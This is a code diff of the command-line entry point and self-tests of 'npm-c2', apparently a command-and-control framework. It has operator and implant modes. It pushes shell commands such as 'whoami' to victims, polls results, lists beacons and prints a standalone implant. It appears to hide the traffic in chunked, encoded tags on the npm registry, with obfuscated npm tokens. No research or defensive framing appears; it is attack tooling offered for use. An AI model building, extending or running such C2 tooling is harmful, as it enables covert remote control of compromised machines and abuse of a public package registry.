@@ -3,25 +3,59 @@ import sys
 
 
 def _test():
-    from . import encode_payload, decode_tag, CMD_PREFIX
-    tags = encode_payload(b"whoami", CMD_PREFIX)
-    assert len(tags) == 1
-    assert tags[0].startswith(CMD_PREFIX)
-    info = decode_tag(tags[0])
-    assert info and info[1] == b"whoami"
-    assert decode_tag("bogus") is None
-    assert len(encode_payload(b"x" * 500)) > 1
+    from . import (encode_payload, decode_tag, reassemble, group_chunks,
+                   CMD_PREFIX, obfuscate_token, deobfuscate_token,
+                   registry_path, MAX_TAG_LEN)
 
-    from . import obfuscate_token, deobfuscate_token
+    # single short payload
+    tags = encode_payload(b"whoami", CMD_PREFIX)
+    assert len(tags) == 1, tags
+    assert tags[0].startswith(CMD_PREFIX)
+    assert max(len(t) for t in tags) <= MAX_TAG_LEN
+    info = decode_tag(tags[0])
+    assert info and info["data"] == b"whoami"
+    assert reassemble(tags) == [b"whoami"]
+    assert decode_tag("bogus") is None
+    assert decode_tag(f"{CMD_PREFIX}zzzz-0101_!!!!") is None
+
+    # chunking + reassembly, including order independence
+    payload = b"x" * 5000
+    chunked = encode_payload(payload)
+    assert len(chunked) > 1
+    assert max(len(t) for t in chunked) <= MAX_TAG_LEN
+    assert reassemble(chunked) == [payload]
+    assert reassemble(list(reversed(chunked))) == [payload]
+
+    # incomplete group is reported, never emitted as a command
+    partial = chunked[:-1]
+    assert reassemble(partial) == []
+    assert any(not complete for _, complete in group_chunks(partial))
+
+    # two payloads in one poll stay separate
+    a = encode_payload(b"alpha", CMD_PREFIX)
+    b = encode_payload(b"beta", CMD_PREFIX)
+    assert reassemble(a + b) == [b"alpha", b"beta"]
+
+    # v1 tags still decode
+    v1 = decode_tag("x64-abcdef_d2hvYW1p")
+    assert v1 and v1["data"] == b"whoami" and v1["total"] == 1
+
+    # scoped package encoding
+    assert registry_path("@scope/pkg") == "@scope%2fpkg"
+    assert registry_path("plain") == "plain"
+
+    # token round-trip
     t = obfuscate_token("npm_xxxx", "test-pkg")
     assert deobfuscate_token(t, "test-pkg") == "npm_xxxx"
     assert t != obfuscate_token("npm_xxxx", "other-pkg")
+    assert deobfuscate_token("zz", "test-pkg") is None
+
     print("[+] all tests ok")
 
 
 def main():
     p = argparse.ArgumentParser(prog="npm-c2")
-    p.add_argument("--version", action="version", version="1.0.0")
+    p.add_argument("--version", action="version", version="1.1.0")
     p.add_argument("--self-test", action="store_true")
     p.add_argument("--generate-standalone", action="store_true",
                    help="print standalone implant to stdout")
@@ -68,7 +102,7 @@ def main():
 
     if args.generate_standalone:
         if args.token and not args.package:
-            print("[-] --package required with --token")
+            print("[-] --package required with --token", file=sys.stderr)
             sys.exit(1)
         from .implant import generate_standalone
         print(generate_standalone(token=args.token, package=args.package))
@@ -80,27 +114,32 @@ def main():
         return
 
     if args.mode == "operator":
-        from .operator import Operator
+        from .operator import Operator, RegistryError
         o = Operator(args.package, args.token)
-        if args.action == "task":
-            if args.cmd:
-                o.push_task(args.cmd)
-            elif args.file:
-                with open(args.file, "rb") as f:
-                    o.push_task(f.read().decode("utf-8", errors="replace"))
-            else:
-                print("[-] use --cmd or --file")
-                sys.exit(1)
-        elif args.action == "poll":
-            o.poll_results()
-        elif args.action == "beacons":
-            o.list_beacons()
-        elif args.action == "clean":
-            o.clean_tags(all_tags=args.all)
-        elif args.action == "watch":
-            o.watch(args.interval)
-        elif args.action == "stats":
-            o.stats()
+        try:
+            if args.action == "task":
+                if args.cmd:
+                    ok = o.push_task(args.cmd)
+                elif args.file:
+                    with open(args.file, "rb") as f:
+                        ok = o.push_task(f.read().decode("utf-8", errors="replace"))
+                else:
+                    print("[-] use --cmd or --file", file=sys.stderr)
+                    sys.exit(1)
+                sys.exit(0 if ok else 1)
+            elif args.action == "poll":
+                o.poll_results()
+            elif args.action == "beacons":
+                o.list_beacons()
+            elif args.action == "clean":
+                o.clean_tags(all_tags=args.all)
+            elif args.action == "watch":
+                o.watch(args.interval)
+            elif args.action == "stats":
+                o.stats()
+        except RegistryError as e:
+            print(f"[-] {e}", file=sys.stderr)
+            sys.exit(2)
 
     elif args.mode == "implant":
         from .implant import Implant
